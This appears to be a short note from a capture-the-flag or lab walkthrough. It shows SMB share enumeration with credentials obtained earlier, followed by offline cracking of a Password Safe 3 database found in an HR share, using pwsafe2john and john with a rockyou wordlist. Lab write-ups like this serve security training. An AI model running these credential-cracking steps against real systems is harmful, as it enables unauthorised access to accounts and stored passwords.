- We can connect using the credentials obtained from [[Initial Foothold]]
	- `smbclient -L //172.16.119.10/ -U 'nexura.htb\hwilliam'`
	- ![[Pasted image 20250706081020.png]]

# Shares Enumeration
----
- This user was a part of HR group on `JUMP01` machine, so thought of connecting to HR share
- ![[Pasted image 20250706081028.png]]
- psafe3 stood out as **==Password Safe 3 application was installed on JUMP01==**
- ![[Pasted image 20250706081040.png]]

- Get it and crack using `pwsafe2john`:
	- `pwsafe2john Employee-Passwords_OLD.psafe3 > psafehash`
	- `john --wordlist=/usr/share/wordlists/rockyou.txt psafehash`
		- ![[Pasted image 20250706081148.png]]

[[JUMP01 - 172.16.119.7]]